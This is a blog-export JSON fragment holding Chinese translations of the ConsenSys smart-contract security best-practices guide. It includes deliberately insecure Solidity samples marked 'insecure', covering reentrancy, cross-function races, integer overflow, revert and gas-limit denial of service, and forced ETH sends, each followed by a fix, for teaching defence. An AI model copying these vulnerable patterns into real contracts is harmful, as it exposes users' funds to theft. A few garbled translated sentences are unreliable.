基本权衡：简单与复杂的实例\n\n在评估智能合约系统的结构和安全性时，需要考虑多个基本的权衡。任何智能合约系统的常规建议是在这些基本的权衡之间找到合适的平衡点。\n\n从软件工程来说，理想的智能合约系统是模块化的，复用代码而不是复制代码，并且支持组建可升级。从安全架构来看，一个理想的智能合约要分享它的观念模式，特别是复杂的智能合约系统。\n\n但是，也存在着软件工程和安全不能保持一致的重要的例外。在这些情况下，通过顺着合约系统的维度的最佳组合获得合适的平衡点，比如：\n\n* 静态 与 可升级\n* 整体 与 模块化\n* 重复 与 复用\n\n### 静态和可升级\n\n尽管包括这个在内的多种资源强调拓展特性，例如可删除，可升级或者可修改的模式，但在可塑性和安全性之间还是需要一个基本的平衡。\n\n根据定义，可塑性模式增加了复杂性和潜在的被攻击可能性。在智能合约系统在预定义的有限时间段内执行非常有限的一组功能的情况下，简单性比复杂性更有效率，例如，无管理的有限时间帧令牌销售合约系统。\n\n### 单一整体和模块化\n\n一个单一的只有自身的合约保证了所有的内容都可以在自身被识别与读取。尽管几乎很少有被高度重视的智能合约系统作为一个庞然大物单独存在，但是也有一个理由极端地要求数据和流程在本地 - 例如，优化代码审查效率的情况下。\n\n与在此考虑的其他平衡一样，安全最佳实践趋向于在简单短期合约中的使用软件工程最佳实践，以及在更复杂更长久的合约系统中趋向于软件工程最佳实践。\n\n### 复制与复用\n\n从软件工程的角度看，智能合约系统希望在合理的情况下最大限度地提高重用率。在 Solidity 中有很多方法可以重用合约代码。使用自己拥有的经过验证的已经被部署了的合约通常是实现代码复用的最安全方式。\n\n在自己之前已经部署的合约不可用的情况下，通常就会依赖复制。Live Libs 和 Zeppelin Solidity 等努力试图提供一些模式，一遍复用安全代码而不是复制。任何合约安全分析必须包含之前没有建立与目标智能合约系统中的资金风险相当的信任等级的任何复用的代码。\n","slug":"智能合约最佳实践翻译一","published":1,"updated":"2018-03-15T11:03:13.845Z","layout":"post","photos":[],"link":"","_id":"cjf7piavp0013pkwoy0wj1l2h","content":"<p><a href=\"https://consensys.github.io/smart-contract-best-practices/general_philosophy/\" target=\"_blank\" rel=\"noopener\">原文链接</a></p>\n<h2 id=\"常规理念\"><a href=\"#常规理念\" class=\"headerlink\" title=\"常规理念\"></a>常规理念</h2><p>以太坊和复杂的区块链编程是崭新的和高度实验性的。 因此，随着新 bug 和安全风险的发现，您应该预期到安全形势会不断发生变化，并制定新的最佳实践。 因此，遵循本文档中的安全措施只是作为智能合约开发人员需要做的安全工作的开始。</p>\n<p>智能合约编程需要一个与您过往习惯不同的工程思维。失败的代价可能很高，并且更改可能很困难，使得它在某些方面更像硬件编程或金融服务编程，而不是 Web 或移动开发。因此，防御已知的漏洞是不够的。相反，你需要学习一种新的开发理念：</p>\n<h3 id=\"做好失败的准备\"><a href=\"#做好失败的准备\" class=\"headerlink\" title=\"做好失败的准备\"></a>做好失败的准备</h3><p>任何不平凡的（non-trivial）合约中都有错误。因此你的代码必须能够优雅地反馈 Bug 和漏洞。</p>\n<ul>\n<li>当出现错误时暂停该合约（“电路中断者”） </li>\n<li>管理风险金额（限制比例，设置最大使用量）</li>\n<li>为错误修正和改进提供有效的升级途径</li>\n</ul>\n<h3 id=\"小心地推出\"><a href=\"#小心地推出\" class=\"headerlink\" title=\"小心地推出\"></a>小心地推出</h3><p>在完整的产品发布前捕获错误总是更好。彻底地测试合约，并在每次发现新的攻击媒介时添加新的测试 - 从 alpha 测试网络起就提供 Bug 悬赏 - 随着每个阶段的使用和测试推出。</p>\n<h3 id=\"保持合约简单\"><a href=\"#保持合约简单\" class=\"headerlink\" title=\"保持合约简单\"></a>保持合约简单</h3><p>复杂性增加错误的可能性。</p>\n<ul>\n<li>确定合约的逻辑简单</li>\n<li>通过模块化使得合约和函数小巧</li>\n<li>在可以使用的地方使用已经存在的工具或者代码（比如，不要使用你自己写的随机数生成器）</li>\n<li>只要有可能，请尽量保持清晰</li>\n<li>只对你的系统中需要去中心化的部分使用区块链</li>\n</ul>\n<h3 id=\"保持更新\"><a href=\"#保持更新\" class=\"headerlink\" title=\"保持更新\"></a>保持更新</h3><p>使用下一节中列出的资源跟踪新的安全开发。</p>\n<ul>\n<li>检测你的合同是否有任何新发现的 bug</li>\n<li>尽可能快的将工具或者类库更新到最新的版本</li>\n<li>接受新的使用的安全技术</li>\n</ul>\n<h3 id=\"注意区块链的属性\"><a href=\"#注意区块链的属性\" class=\"headerlink\" title=\"注意区块链的属性\"></a>注意区块链的属性</h3><p>虽然你的编程经验大部分将与以太坊编程相关，但有一些陷阱需要注意。</p>\n<ul>\n<li>要非常小心外部合约的调用，这可能会执行恶意代码并更改控制流。</li>\n<li>了解你的公共函数是公开的，可能会被恶意地调用。任何人都可以查看您的私人数据。</li>\n<li>记住燃料的消耗和区块燃料的限制。</li>\n</ul>\n<h3 id=\"基本权衡：简单与复杂的实例\"><a href=\"#基本权衡：简单与复杂的实例\" class=\"headerlink\" title=\"基本权衡：简单与复杂的实例\"></a>基本权衡：简单与复杂的实例</h3><p>在评估智能合约系统的结构和安全性时，需要考虑多个基本的权衡。任何智能合约系统的常规建议是在这些基本的权衡之间找到合适的平衡点。</p>\n<p>从软件工程来说，理想的智能合约系统是模块化的，复用代码而不是复制代码，并且支持组建可升级。从安全架构来看，一个理想的智能合约要分享它的观念模式，特别是复杂的智能合约系统。</p>\n<p>但是，也存在着软件工程和安全不能保持一致的重要的例外。在这些情况下，通过顺着合约系统的维度的最佳组合获得合适的平衡点，比如：</p>\n<ul>\n<li>静态 与 可升级</li>\n<li>整体 与 模块化</li>\n<li>重复 与 复用</li>\n</ul>\n<h3 id=\"静态和可升级\"><a href=\"#静态和可升级\" class=\"headerlink\" title=\"静态和可升级\"></a>静态和可升级</h3><p>尽管包括这个在内的多种资源强调拓展特性，例如可删除，可升级或者可修改的模式，但在可塑性和安全性之间还是需要一个基本的平衡。</p>\n<p>根据定义，可塑性模式增加了复杂性和潜在的被攻击可能性。在智能合约系统在预定义的有限时间段内执行非常有限的一组功能的情况下，简单性比复杂性更有效率，例如，无管理的有限时间帧令牌销售合约系统。</p>\n<h3 id=\"单一整体和模块化\"><a href=\"#单一整体和模块化\" class=\"headerlink\" title=\"单一整体和模块化\"></a>单一整体和模块化</h3><p>一个单一的只有自身的合约保证了所有的内容都可以在自身被识别与读取。尽管几乎很少有被高度重视的智能合约系统作为一个庞然大物单独存在，但是也有一个理由极端地要求数据和流程在本地 - 例如，优化代码审查效率的情况下。</p>\n<p>与在此考虑的其他平衡一样，安全最佳实践趋向于在简单短期合约中的使用软件工程最佳实践，以及在更复杂更长久的合约系统中趋向于软件工程最佳实践。</p>\n<h3 id=\"复制与复用\"><a href=\"#复制与复用\" class=\"headerlink\" title=\"复制与复用\"></a>复制与复用</h3><p>从软件工程的角度看，智能合约系统希望在合理的情况下最大限度地提高重用率。在 Solidity 中有很多方法可以重用合约代码。使用自己拥有的经过验证的已经被部署了的合约通常是实现代码复用的最安全方式。</p>\n<p>在自己之前已经部署的合约不可用的情况下，通常就会依赖复制。Live Libs 和 Zeppelin Solidity 等努力试图提供一些模式，一遍复用安全代码而不是复制。任何合约安全分析必须包含之前没有建立与目标智能合约系统中的资金风险相当的信任等级的任何复用的代码。</p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://consensys.github.io/smart-contract-best-practices/general_philosophy/\" target=\"_blank\" rel=\"noopener\">原文链接</a></p>\n<h2 id=\"常规理念\"><a href=\"#常规理念\" class=\"headerlink\" title=\"常规理念\"></a>常规理念</h2><p>以太坊和复杂的区块链编程是崭新的和高度实验性的。 因此，随着新 bug 和安全风险的发现，您应该预期到安全形势会不断发生变化，并制定新的最佳实践。 因此，遵循本文档中的安全措施只是作为智能合约开发人员需要做的安全工作的开始。</p>\n<p>智能合约编程需要一个与您过往习惯不同的工程思维。失败的代价可能很高，并且更改可能很困难，使得它在某些方面更像硬件编程或金融服务编程，而不是 Web 或移动开发。因此，防御已知的漏洞是不够的。相反，你需要学习一种新的开发理念：</p>\n<h3 id=\"做好失败的准备\"><a href=\"#做好失败的准备\" class=\"headerlink\" title=\"做好失败的准备\"></a>做好失败的准备</h3><p>任何不平凡的（non-trivial）合约中都有错误。因此你的代码必须能够优雅地反馈 Bug 和漏洞。</p>\n<ul>\n<li>当出现错误时暂停该合约（“电路中断者”） </li>\n<li>管理风险金额（限制比例，设置最大使用量）</li>\n<li>为错误修正和改进提供有效的升级途径</li>\n</ul>\n<h3 id=\"小心地推出\"><a href=\"#小心地推出\" class=\"headerlink\" title=\"小心地推出\"></a>小心地推出</h3><p>在完整的产品发布前捕获错误总是更好。彻底地测试合约，并在每次发现新的攻击媒介时添加新的测试 - 从 alpha 测试网络起就提供 Bug 悬赏 - 随着每个阶段的使用和测试推出。</p>\n<h3 id=\"保持合约简单\"><a href=\"#保持合约简单\" class=\"headerlink\" title=\"保持合约简单\"></a>保持合约简单</h3><p>复杂性增加错误的可能性。</p>\n<ul>\n<li>确定合约的逻辑简单</li>\n<li>通过模块化使得合约和函数小巧</li>\n<li>在可以使用的地方使用已经存在的工具或者代码（比如，不要使用你自己写的随机数生成器）</li>\n<li>只要有可能，请尽量保持清晰</li>\n<li>只对你的系统中需要去中心化的部分使用区块链</li>\n</ul>\n<h3 id=\"保持更新\"><a href=\"#保持更新\" class=\"headerlink\" title=\"保持更新\"></a>保持更新</h3><p>使用下一节中列出的资源跟踪新的安全开发。</p>\n<ul>\n<li>检测你的合同是否有任何新发现的 bug</li>\n<li>尽可能快的将工具或者类库更新到最新的版本</li>\n<li>接受新的使用的安全技术</li>\n</ul>\n<h3 id=\"注意区块链的属性\"><a href=\"#注意区块链的属性\" class=\"headerlink\" title=\"注意区块链的属性\"></a>注意区块链的属性</h3><p>虽然你的编程经验大部分将与以太坊编程相关，但有一些陷阱需要注意。</p>\n<ul>\n<li>要非常小心外部合约的调用，这可能会执行恶意代码并更改控制流。</li>\n<li>了解你的公共函数是公开的，可能会被恶意地调用。任何人都可以查看您的私人数据。</li>\n<li>记住燃料的消耗和区块燃料的限制。</li>\n</ul>\n<h3 id=\"基本权衡：简单与复杂的实例\"><a href=\"#基本权衡：简单与复杂的实例\" class=\"headerlink\" title=\"基本权衡：简单与复杂的实例\"></a>基本权衡：简单与复杂的实例</h3><p>在评估智能合约系统的结构和安全性时，需要考虑多个基本的权衡。任何智能合约系统的常规建议是在这些基本的权衡之间找到合适的平衡点。</p>\n<p>从软件工程来说，理想的智能合约系统是模块化的，复用代码而不是复制代码，并且支持组建可升级。从安全架构来看，一个理想的智能合约要分享它的观念模式，特别是复杂的智能合约系统。</p>\n<p>但是，也存在着软件工程和安全不能保持一致的重要的例外。在这些情况下，通过顺着合约系统的维度的最佳组合获得合适的平衡点，比如：</p>\n<ul>\n<li>静态 与 可升级</li>\n<li>整体 与 模块化</li>\n<li>重复 与 复用</li>\n</ul>\n<h3 id=\"静态和可升级\"><a href=\"#静态和可升级\" class=\"headerlink\" title=\"静态和可升级\"></a>静态和可升级</h3><p>尽管包括这个在内的多种资源强调拓展特性，例如可删除，可升级或者可修改的模式，但在可塑性和安全性之间还是需要一个基本的平衡。</p>\n<p>根据定义，可塑性模式增加了复杂性和潜在的被攻击可能性。在智能合约系统在预定义的有限时间段内执行非常有限的一组功能的情况下，简单性比复杂性更有效率，例如，无管理的有限时间帧令牌销售合约系统。</p>\n<h3 id=\"单一整体和模块化\"><a href=\"#单一整体和模块化\" class=\"headerlink\" title=\"单一整体和模块化\"></a>单一整体和模块化</h3><p>一个单一的只有自身的合约保证了所有的内容都可以在自身被识别与读取。尽管几乎很少有被高度重视的智能合约系统作为一个庞然大物单独存在，但是也有一个理由极端地要求数据和流程在本地 - 例如，优化代码审查效率的情况下。</p>\n<p>与在此考虑的其他平衡一样，安全最佳实践趋向于在简单短期合约中的使用软件工程最佳实践，以及在更复杂更长久的合约系统中趋向于软件工程最佳实践。</p>\n<h3 id=\"复制与复用\"><a href=\"#复制与复用\" class=\"headerlink\" title=\"复制与复用\"></a>复制与复用</h3><p>从软件工程的角度看，智能合约系统希望在合理的情况下最大限度地提高重用率。在 Solidity 中有很多方法可以重用合约代码。使用自己拥有的经过验证的已经被部署了的合约通常是实现代码复用的最安全方式。</p>\n<p>在自己之前已经部署的合约不可用的情况下，通常就会依赖复制。Live Libs 和 Zeppelin Solidity 等努力试图提供一些模式，一遍复用安全代码而不是复制。任何合约安全分析必须包含之前没有建立与目标智能合约系统中的资金风险相当的信任等级的任何复用的代码。</p>\n"},{"title":"智能合约最佳实践翻译三","comments":0,"date":"2018-03-09T03:17:08.000Z","img":null,"_content":"\n## [已知攻击](https://consensys.github.io/smart-contract-best-practices/known_attacks/)\n\n以下列出了你应该知道的已知攻击，并且在编写智能合约的时候进行防御。\n\n### [竞争条件](https://consensys.github.io/smart-contract-best-practices/known_attacks/#footnote-race-condition-terminology)(Race Conditions)\n\n调用外部合约的一个主要危险之一是它会接管控制流，并且修改调用方法不被 期望修改的数据。这种类型的 bug 有很多形式，导致 DAO 崩溃的两个主要错误都是这类错误。\n\n#### 重入(Reentrancy)\n\n这个 bug 的第一个版本需要注意，这个函数可以在函数第一次调用完成之前重复调用。 这可能会导致函数的不同调用以破坏性方式进行交互。\n```\n// insecure\n\nmapping(address => uint) private userBalances;\n\nfunction withdrawBalance() public {\n\tuint amountToWithdraw = userBalances[msg.sender];\n\trequire(msg.sender.call.value(amountToWithdraw)()); // At this point, the call's code is executed, and can call withdrawBalance again\n\tuserBalances[msg.sender] = 0;\n}\n```\n\n因为用户余额直到最后被提取完才会被设置成 0，所以第二次（和更之后）的调用仍然会成功，从而一次又一次地提取余额。一个非常类似的 bug 是 DAO 攻击中的一个漏洞。\n\n在给出的例子中，避免这个问题的最好的办法是通过 [使用 `send()` 代替 `call.value()()`](https://consensys.github.io/smart-contract-best-practices/recommendations#send-vs-call-value)。这会防止执行中的任何外部代码。\n\n然而，如果你不能移除外部调用，下一个简单地防止此攻击的方法是确保直到你完成了所有的内部工作之前都没有调用外部函数，你需要做：\n```\nmapping(address => uint) private userBalances;\n\nfunction withdrawBalance() public {\n\tuint amountToWithdraw = userBalances[msg.sender];\n\tuserBalances[msg.sender] = 0;\n\trequire(msg.sender.call.value(amountToWithdraw)());\n}\n```\n\n注意，如果你有另一个调用了 `withdrawBalance()`的函数，它可能会受到相同的攻击，所以你必须对调用了不可信合约的函数也视为不可信。请参阅下方的潜在解决方案的进一步讨论。\n\n#### 函数交叉竞争条件(Cross-function Race Conditions)\n\n一个攻击者可能使用通过两个不同的函数共享一个状态来进行类似的攻击。\n\n```\n// insecure\n\nmapping(address => uint) private userBalances;\n\nfunction transfer(address to, uint amount) {\n\tif (userBalances[msg.sender] >= amount) {\n\t\tuserBalance[to] += amount;\n\t\tuserBalance[msg.sender] -= amount;\n\t}\n}\n\nfunction withdrawBalance() public {\n\tuint amountToWithdraw = userBalances[msg.sender];\n\trequire(msg.sender.call.value(amountToWithdraw)()); // At this point, the caller's code is executed, and can call transfer()\n\tuserBalances[msg.sender] = 0;\n}\n```\n\n在这个例子中，当攻击者的代码在 `withdrawBalance()` 中的外部调用中被执行，攻击者会调用 `transfer()`。只要他们的余额不是 0，那么他们就可以在已经收到过一次提币的情况下，再次转移 token。这个漏洞也在 DAO 攻击中被使用。\n\n在相同的警告下，相同的解决方案也会起作用。也要注意，在这个例子中，函数都是同一个合约的一部分。但是，如果多个合约共享状态，那么相同的 bug 也可以出现在交叉的多重合约中。\n\n#### 竞争条件解决方案中的陷阱\n\n因为竞争条件可以在多个函数，甚至多个合约中发生，所以任何旨在防止重入的解决方案都是不够的。\n\n相反，我们推荐在完成全部的内部工作之后再调用外部函数。如果你小心地遵循了这个规则，就可以避免竞争条件。但是，你不止要避免太早调用外部函数，也要避免调用了外部函数的函数。举例来说，下面是不安全的：\n```\n// insecure\nmapping(address => uint) private userBalances;\nmapping(address => bool) private claimedBonus;\nmapping(address => uint) private rewardsForA;\n\nfunction withdraw(address recipient) public {\n\tuint amountToWithdraw = userBalances[recipient];\n\trewardsForA[recipient] = 0;\n\trequire(recipient.call.value(amountToWithdraw)());\n}\n\nfunction getFirstWithdrawalBonus(address recipient) public {\n\trequire(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once\n\n\trewardsForA[recipient] += 100;\n\twithdraw(recipient); // At this point, the caller will be able to execute getFirstWithdrawalBonus again.\n\tclaimedBonus[recipient] = true;\n}\n```\n\n即使 `getFirstWithdrawalBonus()` 没有直接调用外部合约，`withdraw()` 内的调用已经足够产生一个竞争条件的漏洞。因此你不可以信任 `withdraw()` 函数。\n```\nmapping(address => uint) private userBalances;\nmapping(address => bool) private claimedBonus;\nmapping(address => uint) private rewardsForA;\n\nfunction untrustedWithdraw(address recipient) public {\n\tuint amountToWithdraw = userBalances[recipient];\n\trewardsForA[recipient] = 0;\n\trequire(recipient.call.value(amountToWithdraw)());\n}\n\nfunction untrustedGetFirstWithdrawalBonus(address recipient) public {\n\trequire(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once\n\n\tclaimedBonus[recipient] = true;\n\trewardsForA[recipient] += 100;\n\tuntrustedWithdraw(recipient); // claimedBonus has been set to true, so reentry is impossible\n}\n```\n\n除了修复重入的问题，[不受信任的函数也被标记了](https://consensys.github.io/smart-contract-best-practices/recommendations/#mark-untrusted-contracts)。这个模式在每个层级都被重复使用：既然 `untrustedGetFirstWithdrawalBonus()` 调用了调用了外部合约的 `untrustedWithdraw()`，那么你就必须将 `untrustedGetFirstWithdrawalBonus()` 视作不安全的。\n\n另一个经常建议的解决方案是一个 [互斥](https://en.wikipedia.org/wiki/Mutual_exclusion)。它允许你 “锁定” 某些状态，所以状态只能被锁的拥有者改变。一个简单的例子如下：\n```\n// Note: This is a rudimentary example, and mutexes are particularly useful where there is substantial logic and/or shared state\nmapping(address => uint) private balance;\nbool private lockBalances;\n\nfunction deposit() payable public returns (bool) {\n\trequire(!lockBalances);\n\tlockBalances = true;\n\tbalances[msg.sender] += msg.value;\n\tlockBalances = false;\n\treturn true;\n}\n\nfunction withdraw(uint amount) payable public returns (bool) {\n\trequire(!lockBalances && amount > 0 && balances[msg.sender] >= amount);\n\tlockBalances = true;\n\n\tif (msg.sender.call(amount)()) {\n\t\tbalances[msg.sender] -= amount;\n\t}\n\n\tlockBalances = false;\n\treturn true;\n}\n```\n\n如果用户试图在第一个调用结束前再次调用 `withdraw()`，锁就会防止其作用。这是一个有用的方式，但是当你有多个合约合作的时候，就会有一些困难。下面是不安全的：\n```\n// insecure\n\ncontract StateHolder {\n\tuint private n;\n\taddress private lockHolder;\n\n\tfunction getLock() {\n\t\trequire(lockHolder == 0);\n\t\tlockHolder = msg.sender;\n\t}\n\n\tfunction releaseLock() {\n\t\trequire(msg.sender == lockHolder);\n\t\tlockHolder = 0;\n\t}\n\n\tfunction set(uint newState) {\n\t\trequire(msg.sender == lockHolder);\n\t\tn = newState;\n\t}\n}\n```\n\n一个攻击者可以调用 `getLock()`，之后就永远不用调用 `releaseLock()`。如果他们这么干了，那么合约将被永远锁定，无法进行任何修改。如果你使用互斥来防止竞争条件，那么你需要小心地确认不会出现只能锁定而不能释放的情况。（使用互斥编程也有其他潜在的危险，如死锁和活锁。如果你想要使用这种方式，你应该查阅咨询大量互斥相关的文献资料。）\n\n###### 有些人可能会反对使用术语竞争条件，因为以太坊目前没有真正的并行性。 然而，逻辑上不同的进程争夺资源的基本特征仍然存在，同样的陷阱和潜在的解决方案也适用。\n\n### 交易顺序依赖（TOD）/ 前台运行\n\n以上的竞争条件示例涉及到攻击者在单笔交易中执行恶意代码。以下是区块链固有的一种不同类型的竞争条件：交易本身（在区块内）的顺序容易受到操纵。\n\n在被打包进区块之前，交易会进入内存池一段时间，因此可以知道交易在被打包之前有什么行为。对于像去中心化市场这类对象来说，这可能会有些麻烦，在这种市场中，可能看到买入 token 的交易，和其他交易被包含之前的市场顺序实现形式。防止这种情况很困难，因为它会涉及到具体合约本身。举例来说，在市场中，实施批量拍卖会更好（这也可以防止高频交易问题）。另一种方法是使用预先提交方案（“我将在稍后提交细节”）。\n\n### 时间戳依赖\n\n注意区块的时间戳可以被矿工操作，所以在不管是直接还是间接的对时间戳的使用中要多加考虑。\n\n有关与时间戳相关的设计注意事项，请参阅 [建议](https://consensys.github.io/smart-contract-best-practices/recommendations/#timestamp-dependence) 部分。\n\n### 整数溢出和下溢\n\n考虑一个简单的 token 转移：\n```\nmapping(address => uint256) public balanceOf;\n\n// insecure\nfunction transfer(address _to, uint256 _value) {\n\t// check if sender has balance\n\trequire(balanceOf[msg.sender] >= _value);\n\t// add and subtract new balances\n\tbalanceOf[msg.sender] -= _value;\n\tbalanceOf[_to] += _value;\n}\n\n// secure\nfunction transfer(address _to, uint256 _value) {\n\t// check if sender has balance and for overflows\n\trequire(balanceOf[msg.sender] >= _value && balanceOf[_to] + _value >= balanceOf[_to]);\n\n\t// add and subtract new balances\n\tbalanceOf[msg.sender] -= _value;\n\tbalanceOf[_to] += _value;\n}\n```\n\n如果余额到达了 uint 值（2^256）的最大值，它会被置为零。这是检查这个条件。这可能有关也可能无关，取决于实现方式。考虑一下 uint 值是否有这个机会达到这么大的一个数字。考虑 uint 变量是如何改变状态的，并且谁有权限来做这样的改变。如果任意用户都可以更新 uint 值，那么就会有很多的攻击漏洞。如果只有一个管理者拥有权限来修改变量的状态，那你可能是安全的。如果一个用户每次尽能增加 1，那你也可能是安全的，因为并没有可行的方式来达到限制。\n\n对于下溢来说也是一样的。如果一个 uint 被设置成小于 0，这就会导致一个下溢然后被设置成它的最大值。\n\n对 uint8, uint16, uint24... 等更小的数据类型要小心：它们会更容易的达到它们的最大值。\n\n注意这里有大约 [20 个关于溢出和下溢的例子](https://github.com/ethereum/solidity/issues/796#issuecomment-253578925)\n\n### （不期望的）回滚导致的 DoS\n\n考虑一个简单的拍卖合约：\n```\n// insecure\n\ncontract Auction {\n\taddress currentLeader;\n\tuint highestBid;\n\n\tfunction bid() payable {\n\t\trequire(msg.value > highestBid);\n\n\t\trequire(currentLeader.send(highestBid)); // Refund the old leader, if it fails then revert\n\n\t\tcurrentLeader = msg.sender;\n\t\thighestBid = msg.value;;\n\t}\n}\n```\n\n当它试图退款给用户的时候，当退款失败，它会回滚。意思是一个恶意的竞标者可以通过让它们的退款*总是*失败而变成领导者。在这个方式中，它们可以防止其他任何人调用 `bid()` 函数，然后保证自己一直都是领导者。一个推荐是如之前所述，设置一个 [拉取支付系统](https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls) 来替代。\n\n另一个例子是当一个合约想要通过便利一个数组来支付给用户（如，在众筹合约中的支持者）。通常都想要确保每一笔支付都成功。如果没有的话，就回滚。这个问题是如果一个调用失败了，你就会回滚整个支付系统，那么循环将永远不会完成。因为一个地址强制错误所以没有人获得报酬。\n\n```\naddress[] private refundAddresses;\nmapping(address => uint) public refunds;\n\n// bad\nfunction refundAll() public {\n\tfor (uint x; x < refundAddresses.length; x++) { // // arbitrary length iteration based on how many addresses participated\n\t\trequire(refundAddresses[x].send(refunds[refundAddresses[x]])) // doubly bad, now a single failure on send will hold up all funds\n\t}\n}\n```\n\n再一次，推荐的解决方法是 [赞成拉推支付](https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls)。\n\n### 区块燃料限制导致的 DoS\n\n你可能注意到了之前的例子中的另一个问题：一次性支付给所有人，你会有触及区块燃料限制的风险。每一个以太坊区块都能处理一个确定的最大算力值。如果你想要超过它，那你的交易就会失败。\n\n即使没有故意的攻击，这也会造成问题。但是，如果攻击者可以操纵所需的燃料值，就会特别糟糕。在之前的例子中，攻击者可以添加大量地址，每一个都需要获得极销量的退款。攻击者的每一个地址退款操作的燃气消耗最终可能超过燃料限制，从而阻止退款交易的发生。\n\n这是另一个 [赞成推拉支付](https://consensys.github.io/smart-contract-best-practices/recommendations#favor-pull-over-push-for-external-calls) 的原因。\n\n如果你必须完全遍历一个你不知道大小的数组，那么你应该计划它可能需要多个区块，因而需要多个交易。你会需要对你当前的进度保持跟踪，并且能够从那个点恢复，就像下面这个例子：\n```\nstruct Payee {\n\taddress addr;\n\tuint256 value;\n}\n\nPayee[] payees;\nuint256 nextPayeeIndex;\n\nfunction payOut() {\n\tuint256 i = nextPayeeIndex;\n\twhile (i < payees.length && msg.gas > 200000) {\n\t\tpayees[i].addr.send(payees[i].value);\n\t\ti++;\n\t}\n\tnextPayeeIndex = i;\n}\n```\n\n你会需要确认在等待 `payOut()` 函数的下一个遍历的时候，如果其他交易被处理，不会有不好的事情发生。所以只在完全必要的时候使用这个模式。\n\n### 强制将 ETH 发送到合约\n\n可以不通过触发合约的 fallback 函数来强行将 ETH 发送到合约。当 fallback 函数内有重要的逻辑或者进行了基于合约余额的计算时，这是一个很重要的考虑。见下面的例子：\n```\ncontract Vulnerable {\n\tfunction () payable {\n\t\trevert();\n\t}\n\n\tfunction somethingBad() {\n\t\trequire(this.balance > 0);\n\t\t// do something bad\n\t}\n}\n```\n\n合约逻辑看起来并不允许合约被支付，因此也不允许 “一些坏事” 发生。但是，存在一些强制发送 ETH 给合约的方法，因此它的余额大于 0。\n\n合约方法 `selfdestruct` 允许用户指定一个受益人发送多余的 ETH。`selfdestruct` [不会触发合约的 fallback 函数](https://solidity.readthedocs.io/en/develop/security-considerations.html#sending-and-receiving-ether)。\n\n也可以[预先计算](https://github.com/Arachnid/uscc/tree/master/submissions-2017/ricmoo)合约的地址，然后在合约部署之前给那个地址发送 ETH。\n\n合约开发者应该注意 ETH 可以被强制发送给合约并且应该设计相应的合约逻辑。通常来说，假设不可能限制你的合约的资金来源。\n\n### 废弃的 / 历史的攻击\n\n这些攻击由于协议的改变或固体的改进而不再可能发生。\n\n#### 调用深度攻击（废弃）\n\n在 EIP 150 的硬分叉中，调用深度攻击不再相关*（在达到 1024 调用深度限制之前，所有气体都将消耗得很好）。\n","source":"_posts/智能合约最佳实践翻译三.md","raw":"---\ntitle: 智能合约最佳实践翻译三\ncomments: false\ndate: 2018-03-09 11:17:08\ncategories: 智能合约\ntags:\n- ZhouFyk\n- 以太坊\n- 智能合约\n- 安全开发\nimg:\n---\n\n## [已知攻击](https://consensys.github.io/smart-contract-best-practices/known_attacks/)\n\n以下列出了你应该知道的已知攻击，并且在编写智能合约的时候进行防御。\n\n### [竞争条件](https://consensys.github.io/smart-contract-best-practices/known_attacks/#footnote-race-condition-terminology)(Race Conditions)\n\n调用外部合约的一个主要危险之一是它会接管控制流，并且修改调用方法不被 期望修改的数据。这种类型的 bug 有很多形式，导致 DAO 崩溃的两个主要错误都是这类错误。\n\n#### 重入(Reentrancy)\n\n这个 bug 的第一个版本需要注意，这个函数可以在函数第一次调用完成之前重复调用。 这可能会导致函数的不同调用以破坏性方式进行交互。\n```\n// insecure\n\nmapping(address => uint) private userBalances;\n\nfunction withdrawBalance() public {\n\tuint amountToWithdraw = userBalances[msg.sender];\n\trequire(msg.sender.call.value(amountToWithdraw)()); // At this point, the call's code is executed, and can call withdrawBalance again\n\tuserBalances[msg.sender] = 0;\n}\n```\n\n因为用户余额直到最后被提取完才会被设置成 0，所以第二次（和更之后）的调用仍然会成功，从而一次又一次地提取余额。一个非常类似的 bug 是 DAO 攻击中的一个漏洞。\n\n在给出的例子中，避免这个问题的最好的办法是通过 [使用 `send()` 代替 `call.value()()`](https://consensys.github.io/smart-contract-best-practices/recommendations#send-vs-call-value)。这会防止执行中的任何外部代码。\n\n然而，如果你不能移除外部调用，下一个简单地防止此攻击的方法是确保直到你完成了所有的内部工作之前都没有调用外部函数，你需要做：\n```\nmapping(address => uint) private userBalances;\n\nfunction withdrawBalance() public {\n\tuint amountToWithdraw = userBalances[msg.sender];\n\tuserBalances[msg.sender] = 0;\n\trequire(msg.sender.call.value(amountToWithdraw)());\n}\n```\n\n注意，如果你有另一个调用了 `withdrawBalance()`的函数，它可能会受到相同的攻击，所以你必须对调用了不可信合约的函数也视为不可信。请参阅下方的潜在解决方案的进一步讨论。\n\n#### 函数交叉竞争条件(Cross-function Race Conditions)\n\n一个攻击者可能使用通过两个不同的函数共享一个状态来进行类似的攻击。\n\n```\n// insecure\n\nmapping(address => uint) private userBalances;\n\nfunction transfer(address to, uint amount) {\n\tif (userBalances[msg.sender] >= amount) {\n\t\tuserBalance[to] += amount;\n\t\tuserBalance[msg.sender] -= amount;\n\t}\n}\n\nfunction withdrawBalance() public {\n\tuint amountToWithdraw = userBalances[msg.sender];\n\trequire(msg.sender.call.value(amountToWithdraw)()); // At this point, the caller's code is executed, and can call transfer()\n\tuserBalances[msg.sender] = 0;\n}\n```\n\n在这个例子中，当攻击者的代码在 `withdrawBalance()` 中的外部调用中被执行，攻击者会调用 `transfer()`。只要他们的余额不是 0，那么他们就可以在已经收到过一次提币的情况下，再次转移 token。这个漏洞也在 DAO 攻击中被使用。\n\n在相同的警告下，相同的解决方案也会起作用。也要注意，在这个例子中，函数都是同一个合约的一部分。但是，如果多个合约共享状态，那么相同的 bug 也可以出现在交叉的多重合约中。\n\n#### 竞争条件解决方案中的陷阱\n\n因为竞争条件可以在多个函数，甚至多个合约中发生，所以任何旨在防止重入的解决方案都是不够的。\n\n相反，我们推荐在完成全部的内部工作之后再调用外部函数。如果你小心地遵循了这个规则，就可以避免竞争条件。但是，你不止要避免太早调用外部函数，也要避免调用了外部函数的函数。举例来说，下面是不安全的：\n```\n// insecure\nmapping(address => uint) private userBalances;\nmapping(address => bool) private claimedBonus;\nmapping(address => uint) private rewardsForA;\n\nfunction withdraw(address recipient) public {\n\tuint amountToWithdraw = userBalances[recipient];\n\trewardsForA[recipient] = 0;\n\trequire(recipient.call.value(amountToWithdraw)());\n}\n\nfunction getFirstWithdrawalBonus(address recipient) 